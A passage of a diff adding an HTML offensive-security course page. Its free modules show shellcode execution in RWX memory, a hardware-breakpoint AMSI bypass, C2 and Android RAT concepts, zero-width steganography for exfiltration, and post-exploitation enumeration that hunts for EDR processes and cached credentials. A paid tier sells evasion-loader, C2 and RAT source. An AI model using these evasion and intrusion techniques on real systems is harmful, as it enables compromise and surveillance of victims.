+        <div class="concept">ETW (Event Tracing for Windows) — telemetry pipe used by EDRs. Bypass: patch EtwEventWrite() to return immediately.</div>
+      </div>
+
+      <div class="lesson-callout">IRON-DOME targets static analysis first (encryption), then behavioral (no RWX memory). VULN-195458 targets AMSI specifically using hardware breakpoints — no write to protected memory at all. That's why it's research-grade.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="defender.html">→ DEFENDER MODULE</a>
+        <a class="module-link" href="irondome.html">→ IRON-DOME MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 10 -->
+  <div class="module" id="m10">
+    <div class="module-head" onclick="toggleModule('m10')">
+      <span class="module-num">10</span>
+      <span class="module-title">Shellcode — Raw Machine Code Execution</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m10')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Shellcode is position-independent machine code. It doesn't need a loader — it runs wherever you put it in memory.</p>
+
+      <p class="lesson">Normal code has a fixed base address. Shellcode must work no matter where it lands — it can't use hardcoded addresses. It finds everything it needs at runtime.</p>
+
+      <div class="code-block"><pre><span class="comment">// x64 shellcode that executes calc.exe</span>
+<span class="comment">// This is what Msfvenom, Cobalt Strike, etc. generate</span>
+unsigned char calc_shellcode[] = {
+    <span class="num">0x48</span>, <span class="num">0x31</span>, <span class="num">0xc9</span>,             <span class="comment">// xor rcx, rcx</span>
+    <span class="num">0x48</span>, <span class="num">0x81</span>, <span class="num">0xe9</span>, <span class="num">0xb7</span>,      <span class="comment">// sub rcx, ...</span>
+    <span class="comment">// ... hundreds more bytes</span>
+    <span class="comment">// finds kernel32.dll in memory,</span>
+    <span class="comment">// resolves WinExec(),</span>
+    <span class="comment">// calls WinExec("calc.exe")</span>
+};
+
+<span class="comment">// Embed and execute</span>
+<span class="type">void</span>* mem = VirtualAlloc(NULL, sizeof(calc_shellcode),
+    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+memcpy(mem, calc_shellcode, sizeof(calc_shellcode));
+((<span class="type">void</span>(*)())mem)();   <span class="comment">// execute</span></pre></div>
+
+      <div class="lesson-callout">The PAGE_EXECUTE_READWRITE flag is what AV watches for — memory that's writable AND executable. IRON-DOME writes encrypted shellcode (just READWRITE), then changes it to EXECUTE_READ after decryption. That's the core evasion.</div>
+    </div>
+  </div>
+
+  <!-- MODULE 11 -->
+  <div class="module" id="m11">
+    <div class="module-head" onclick="toggleModule('m11')">
+      <span class="module-num">11</span>
+      <span class="module-title">AMSI Bypass — VULN-195458 Explained</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m11')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">This is the original research. MSRC VULN-195458. Hardware breakpoints to bypass AMSI without writing to protected memory.</p>
+
+      <p class="lesson">Normal AMSI bypass: patch the first bytes of <code>AmsiScanBuffer()</code> to return <code>AMSI_RESULT_CLEAN</code> immediately. Problem: Windows Tamper Protection watches for writes to protected memory regions like AMSI. It detects the patch.</p>
+
+      <p class="lesson"><em>Hardware breakpoints (HWBP)</em> solve this. Instead of writing to memory, you set a debug register (<code>DR0-DR3</code>) to trigger an exception when <code>AmsiScanBuffer()</code> is called. Your exception handler fires, fakes the return value, and execution continues. <strong>Zero writes to protected memory.</strong></p>
+
+      <div class="code-block"><pre><span class="comment">// HWBP AMSI bypass — conceptual</span>
+
+<span class="comment">// 1. Find AmsiScanBuffer address in amsi.dll</span>
+<span class="type">HMODULE</span> amsi = LoadLibrary(<span class="string">"amsi.dll"</span>);
+<span class="type">FARPROC</span> scanBuf = GetProcAddress(amsi, <span class="string">"AmsiScanBuffer"</span>);
+
+<span class="comment">// 2. Set DR0 to break on execution of AmsiScanBuffer</span>
+ctx.Dr0 = (<span class="type">DWORD64</span>)scanBuf;
+ctx.Dr7 = <span class="num">0x1</span>;              <span class="comment">// enable DR0, execute break</span>
+SetThreadContext(GetCurrentThread(), &amp;ctx);
+
+<span class="comment">// 3. Add vectored exception handler</span>
+AddVectoredExceptionHandler(<span class="num">1</span>, amsiHandler);
+
+<span class="comment">// amsiHandler fires when AmsiScanBuffer is called.</span>
+<span class="comment">// We set RIP past the scan, return AMSI_RESULT_CLEAN.</span>
+<span class="comment">// No memory was written. Tamper Protection sees nothing.</span></pre></div>
+
+      <div class="lesson-callout">This is why it's research-grade. Not because I'm a legendary kernel warrior — because the technique is genuinely novel. MSRC reviewed it. That's the receipt.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="defender.html">→ EVASION MODULE</a>
+        <a class="module-link" href="fuzzer.html">→ FUZZER MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 12 -->
+  <div class="module" id="m12">
+    <div class="module-head" onclick="toggleModule('m12')">
+      <span class="module-num">12</span>
+      <span class="module-title">C2 Architecture — Command &amp; Control</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m12')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">What is a C2 framework and how does CHEYANNE work?</p>
+
+      <p class="lesson">C2 = command and control. You infect a machine (implant). The implant calls home to your server. You send commands. It executes them and returns output. That's it.</p>
+
+      <div class="module-concepts">
+        <div class="concept-label">C2 COMPONENTS</div>
+        <div class="concept">Implant (beacon) — runs on the victim. Calls home over HTTP/S, DNS, or raw TCP.</div>
+        <div class="concept">Handler (server) — receives callbacks, queues commands, stores output.</div>
+        <div class="concept">Operator console — the UI you use to send commands to live implants.</div>
+        <div class="concept">Staging — how you get the implant onto the target in the first place.</div>
+        <div class="concept">Sleep + jitter — implant sleeps between callbacks to avoid constant network traffic detection.</div>
+        <div class="concept">Malleable profiles — change C2 traffic to look like legitimate browser traffic.</div>
+      </div>
+
+      <div class="lesson-callout">CHEYANNE implements all of this. Beacon implant + handler + operator console. The full kill chain. Source code is in the Full Bundle.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="cheyanne.html">→ CHEYANNE MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 13 -->
+  <div class="module" id="m13">
+    <div class="module-head" onclick="toggleModule('m13')">
+      <span class="module-num">13</span>
+      <span class="module-title">Android Security — How RATs Work</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m13')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Android is Linux with a permission model on top. Bypassing that model is what STARKILLER does.</p>
+
+      <p class="lesson">Android apps run in a sandbox — each app has its own UID. They communicate through <em>Intents</em>. System resources (camera, GPS, SMS) are gated by <em>permissions</em> declared in AndroidManifest.xml.</p>
+      <p class="lesson">A RAT (Remote Access Trojan) on Android declares the permissions it needs, gets the user to install it (usually social engineering), and then uses those permissions to exfiltrate data.</p>
+
+      <div class="module-concepts">
+        <div class="concept-label">STARKILLER CAPABILITIES</div>
+        <div class="concept">Device info — model, OS version, IMEI, carrier</div>
+        <div class="concept">SMS intercept — reads and forwards incoming messages</div>
+        <div class="concept">GPS tracking — continuous location updates</div>
+        <div class="concept">Contact dump — full contact list exfiltration</div>
+        <div class="concept">Remote shell — execute commands on device</div>
+        <div class="concept">APK obfuscation — disguise as legitimate app</div>
+      </div>
+
+      <div class="module-links">
+        <a class="module-link" href="starkiller.html">→ STARKILLER MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 14 -->
+  <div class="module" id="m14">
+    <div class="module-head" onclick="toggleModule('m14')">
+      <span class="module-num">14</span>
+      <span class="module-title">Steganography &amp; Covert Channels</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m14')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Hiding data in plain sight. What Ghost-Encoder does and why it's useful for C2.</p>
+
+      <p class="lesson">Steganography = hiding data inside innocent-looking data. Images, audio, text. Ghost-Encoder hides data in Unicode zero-width characters — invisible to the human eye, encoded in the bytes.</p>
+
+      <div class="code-block"><pre><span class="comment">// Zero-width character encoding</span>
+<span class="comment">// U+200B = zero-width space (bit 0)</span>
+<span class="comment">// U+200C = zero-width non-joiner (bit 1)</span>
+
+<span class="comment">// Encode "A" (0x41 = 01000001) in zero-width chars</span>
+<span class="comment">// '0' → U+200B, '1' → U+200C</span>
+encoded = <span class="string">"​‌​​​​​‌"</span>
+<span class="comment">// Looks like: "" (empty string to human eye)</span>
+<span class="comment">// Contains:   "A" in binary</span>
+
+<span class="comment">// Use case: exfiltrate data in a Slack message.</span>
+<span class="comment">// Message looks clean. Data is there.</span></pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="ghost.html">→ GHOST-ENCODER MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 15 -->
+  <div class="module" id="m15">
+    <div class="module-head" onclick="toggleModule('m15')">
+      <span class="module-num">15</span>
+      <span class="module-title">Network Recon &amp; Windows Enumeration</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag ps">PS</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m15')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Post-exploitation: you're in. Now what? Map the environment. This is WinRecon's domain.</p>
+
+      <div class="code-block"><pre><span class="comment"># Post-exploitation enumeration — PowerShell</span>
+
+<span class="comment"># Who am I?</span>
+whoami /all
+
+<span class="comment"># What can I reach?</span>
+Get-NetTCPConnection | Where-Object {<span class="keyword">$_</span>.State -eq <span class="string">'Listen'</span>}
+
+<span class="comment"># What's in the network?</span>
+Get-ADComputer -Filter * | Select Name, DNSHostName
+
+<span class="comment"># What processes are running? (spot AV/EDR)</span>
+Get-Process | Where-Object {<span class="keyword">$_</span>.Name -match <span class="string">'defender|sentinel|crowdstrike'</span>}
+
+<span class="comment"># What credentials are cached?</span>
+cmdkey /list
+
+<span class="comment"># Scheduled tasks (persistence check)</span>
+Get-ScheduledTask | Where-Object {<span class="keyword">$_</span>.TaskPath -notlike <span class="string">'\Microsoft\*'</span>}</pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="skywalker.html">→ WINRECON MODULE</a>
+        <a class="module-link" href="networking.html">→ NETWORKING MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 16 -->
+  <div class="module" id="m16">
+    <div class="module-head" onclick="toggleModule('m16')">
+      <span class="module-num">16</span>
+      <span class="module-title">Fuzzing — Finding Bugs in Software</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag py">PY</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m16')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">How to find vulnerabilities in software you don't have source code for.</p>
+
+      <p class="lesson">Fuzzing = throwing semi-random inputs at a program until it crashes. Crashes indicate bugs. Some bugs are exploitable.</p>
+      <p class="lesson">The workflow: <em>generate input → feed to target → monitor for crash → if crash, record input → analyse crash type → is it exploitable?</em></p>
+
+      <div class="code-block"><pre><span class="comment"># Simple dumb fuzzer</span>
+<span class="keyword">import</span> socket, time
+
+target = (<span class="string">"192.168.1.100"</span>, <span class="num">21</span>)   <span class="comment"># FTP server</span>
+payload_sizes = [<span class="num">100</span>, <span class="num">500</span>, <span class="num">1000</span>, <span class="num">2000</span>, <span class="num">5000</span>]
+
+<span class="keyword">for</span> size <span class="keyword">in</span> payload_sizes:
+    <span class="keyword">try</span>:
+        s = socket.socket()
+        s.connect(target)
+        s.recv(<span class="num">1024</span>)                      <span class="comment"># recv banner</span>
+        s.send(b<span class="string">"USER "</span> + b<span class="string">"A"</span> * size + b<span class="string">"\r\n"</span>)
+        print(f<span class="string">"Sent {size} bytes — no crash"</span>)
+        s.close()
+    <span class="keyword">except</span>:
+        print(f<span class="string">"CRASHED at {size} bytes!"</span>)
+        <span class="keyword">break</span>
+    time.sleep(<span class="num">0.5</span>)</pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="fuzzer.html">→ FUZZER MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 17 -->
+  <div class="module" id="m17">
+    <div class="module-head" onclick="toggleModule('m17')">
+      <span class="module-num">17</span>
+      <span class="module-title">Defensive Security — What the Blue Team Sees</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m17')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">You can't be a good attacker without understanding the defender. This closes the loop.</p>
+
+      <div class="module-concepts">
+        <div class="concept-label">WHAT BLUE TEAM SEES</div>
+        <div class="concept">SIEM alerts — aggregated logs from endpoints, network, AV. Correlation rules fire on suspicious patterns.</div>
+        <div class="concept">EDR telemetry — process creation, network connections, file writes, registry changes. All logged.</div>
+        <div class="concept">Memory forensics — Volatility/WinPmem dumps RAM. Finds injected code, C2 beacons, hidden processes.</div>
+        <div class="concept">Network traffic — C2 beacons have patterns. Sleep intervals, packet sizes, TLS fingerprints (JA3).</div>
+        <div class="concept">IOCs — Indicators of Compromise. File hashes, IP addresses, mutex names, registry keys. AV shares these.</div>
+      </div>
+
+      <div class="lesson-callout">GeoDefend automates blue team scanning. It maps your attack surface and flags the same IOCs a real EDR would catch. Use it on your own infrastructure to find what an attacker would see.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="defender.html">→ DEFENSIVE MODULE</a>
+        <a class="module-link" href="report.html">→ REPORTING</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 18 -->
+  <div class="module" id="m18">
+    <div class="module-head" onclick="toggleModule('m18')">
+      <span class="module-num">18</span>
+      <span class="module-title">OPSEC — Not Getting Caught</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m18')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Operational security. Everything you do leaves a trace. Knowing what traces you leave is how you reduce them.</p>
+
+      <div class="module-concepts">
+        <div class="concept-label">OPSEC BASICS</div>
+        <div class="concept">Every process you spawn has a parent PID — anomalous parent/child chains are flagged (e.g. Word spawning powershell.exe)</div>
+        <div class="concept">Timestamps — file creation, modification, access. All logged by Windows.</div>
+        <div class="concept">Prefetch — Windows records what executables ran and when. Forensic gold.</div>
+        <div class="concept">Registry — your changes are logged with timestamps in USN journal and registry hives.</div>
+        <div class="concept">Memory artifacts — injected DLLs show up in VAD tree even if hidden from process list.</div>
+        <div class="concept">Network — DNS requests, TLS handshakes, connection timing all visible to network defenders.</div>
+      </div>
+
+      <div class="module-links">
+        <a class="module-link" href="csec.html">→ CSEC MODULE</a>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+<div class="glow"></div>
+
+<!-- ──────────────────────────────────────────────────────── -->
+<!-- TRACK 3: TOOLS — PAYWALL -->
+<!-- ──────────────────────────────────────────────────────── -->
+<section id="tools" style="background:var(--bg2);">
+<div class="container">
+  <div class="track-header">
+    <div class="track-tag">// TRACK 3 — PAID</div>
+    <h2 class="track-title" style="color:var(--gold);">THE SOURCE CODE</h2>
+    <p class="track-desc">The knowledge above is free. The tools you build with it are yours. The source code for ours costs money — because building them did.</p>
+  </div>
+
+  <div class="module locked" id="m19">
+    <div class="module-head" onclick="window.location.href='pricing.html'">
+      <span class="module-num">19</span>
+      <span class="module-title">IRON-DOME v4 — AV Evasion Loader Source</span>
+      <div class="module-tags"><span class="tag paid">PAID</span><span class="tag c">C</span></div>
+      <div class="module-check">🔒</div>
+      <span class="module-arrow">▶</span>
+    </div>
+  </div>
+
+  <div class="module locked" id="m20">
+    <div class="module-head" onclick="window.location.href='pricing.html'">
+      <span class="module-num">20</span>
+      <span class="module-title">CHEYANNE C2 — Full C2 Framework Source</span>
+      <div class="module-tags"><span class="tag paid">PAID</span></div>
+      <div class="module-check">🔒</div>
+      <span class="module-arrow">▶</span>
+    </div>
+  </div>
+
+  <div class="module locked" id="m21">
+    <div class="module-head" onclick="window.location.href='pricing.html'">
+      <span class="module-num">21</span>
+      <span class="module-title">STARKILLER — Android RAT Source (Kotlin)</span>
+      <div class="module-tags"><span class="tag paid">PAID</span></div>
+      <div class="module-check">🔒</div>
+      <span class="module-arrow">▶</span>
+    </div>
+  </div>
+
+  <div class="module locked" id="m22">
+    <div class="module-head" onclick="window.location.href='pricing.html'">
+      <span class="module-num">22</span>
+      <span class="module-title">WinRecon / SKYWALKER — Recon Suite Source</span>
+      <div class="module-tags"><span class="tag paid">PAID</span></div>
+      <div class="module-check">🔒</div>
+      <span class="module-arrow">▶</span>
+    </div>
+  </div>
+
+  <div class="module locked" id="m23">
+    <div class="module-head" onclick="window.location.href='pricing.html'">
+      <span class="module-num">23</span>
+      <span class="module-title">Ghost-Encoder + GeoDefend — Source Code</span>
+      <div class="module-tags"><span class="tag paid">PAID</span></div>
+      <div class="module-check">🔒</div>
+      <span class="module-arrow">▶</span>
+    </div>
+  </div>
+
+  <div style="text-align:center;margin:2.5rem 0;">
+    <p style="font-size:.64rem;color:var(--tdim);margin-bottom:1.2rem;line-height:1.7;">18 modules above are free. The source repos are the product.<br>A$21.99/mo or A$247.50 one-time for everything.</p>
+    <a href="pricing.html" style="display:inline-block;background:var(--gdim);color:#010f01;font-size:.64rem;font-weight:700;letter-spacing:.18em;padding:.8rem 2rem;text-decoration:none;">VIEW PRICING →</a>
+  </div>
+
+</div>
+</section>
+
+<!-- FOOTER -->
+<div class="glow"></div>
+<footer class="footer">
+  <strong style="color:var(--gdim);">22ND SURVEY DIVISION — FREE CRASH COURSE</strong><br>
+  Occupation Force Callsign GSW Pty Ltd &nbsp;·&nbsp; ABN 50 692 429 397 &nbsp;·&nbsp; ACN 692 429 397<br>
+  <a href="https://rainfantry.github.io/22nd-survey-division/">22DIV main site</a> &nbsp;·&nbsp;
+  <a href="pricing.html">pricing</a> &nbsp;·&nbsp;
+  <a href="index.html">portfolio</a> &nbsp;·&nbsp;
+  <a href="mailto:gwu0738@gmail.com">gwu0738@gmail.com</a><br>
+  <span style="color:var(--tfaint);font-size:.38rem;">For authorised security testing only. All tools are for research and educational purposes. Know your jurisdiction.</span>
+</footer>
+
+<script src="payment-widget.js"></script>
+
+<script>
+// ── PROGRESS TRACKING ──
+var FREE_MODULES = ['m01','m02','m03','m04','m05','m06','m07','m08',
+                    'm09','m10','m11','m12','m13','m14','m15','m16','m17','m18'];
+var DONE_KEY = '22div-cc-done';
+
+function getDone() {
+  try { return JSON.parse(localStorage.getItem(DONE_KEY) || '{}'); } catch(e) { return {}; }
+}
+function saveDone(d) {
+  try { localStorage.setItem(DONE_KEY, JSON.stringify(d)); } catch(e) {}
+}
+
+function updateProgress() {
+  var done = getDone();
+  var count = FREE_MODULES.filter(function(id){ return done[id]; }).length;
+  var pct = Math.round(count / FREE_MODULES.length * 100);
+  document.getElementById('progress-fill').style.width = pct + '%';
+  document.getElementById('progress-count').textContent = count + ' / ' + FREE_MODULES.length + ' FREE';
+}
+
+function checkModule(id) {
+  var done = getDone();
+  done[id] = !done[id];
+  saveDone(done);
+  var el = document.getElementById(id);
+  if (el) {
+    if (done[id]) {
+      el.classList.add('done');
+      el.querySelector('.module-check').textContent = '✓';
+    } else {
+      el.classList.remove('done');
+      el.querySelector('.module-check').textContent = '✓';
+    }
+  }
+  updateProgress();
+}
+
+function toggleModule(id) {
+  var el = document.getElementById(id);
+  if (!el || el.classList.contains('locked')) return;
+  el.classList.toggle('open');
+}
+
+// Init state from localStorage
+(function() {
+  var done = getDone();
+  FREE_MODULES.forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el && done[id]) {
+      el.classList.add('done');
+    }
+  });
+  updateProgress();
+})();
+</script>
+</body>
+</html>
